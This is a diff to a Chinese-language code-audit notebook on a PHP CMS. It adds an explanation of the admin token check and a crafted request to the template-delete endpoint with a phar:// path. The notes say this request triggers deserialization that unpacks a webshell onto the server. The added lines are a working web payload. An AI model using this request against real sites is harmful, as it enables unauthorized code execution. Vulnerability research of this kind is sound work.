@@ -116,7 +116,7 @@ pclzip.class.php的问题是最多的，就从这里开始慢慢审计
 
 ![](attachments/Pasted%20image%2020230415133140.png)
 
-这里pe_token_match的判断token
+这里pe_token_match的判断token，这个token是在登录的时候就有对应函数设置好的，是用来校验admin的
 
 ![](attachments/Pasted%20image%2020230415133657.png)
 
@@ -127,3 +127,12 @@ pclzip.class.php的问题是最多的，就从这里开始慢慢审计
 提交phar的时候记录pe_token    c9ef985805818f52722ca596862b8928
 
 ![](attachments/Pasted%20image%2020230415134742.png)
+
+然后构造一个删除的payload
+admin.php?mod=moban&act=del&token=c9ef985805818f52722ca596862b8928&tpl=phar:///var/www/html/data/attachment/brand/7.txt
+
+![](attachments/Pasted%20image%2020230415140103.png)
+
+就触发了phar包将压缩的webshell解压到了对应文件夹
+
+![](attachments/Pasted%20image%2020230415140212.png)
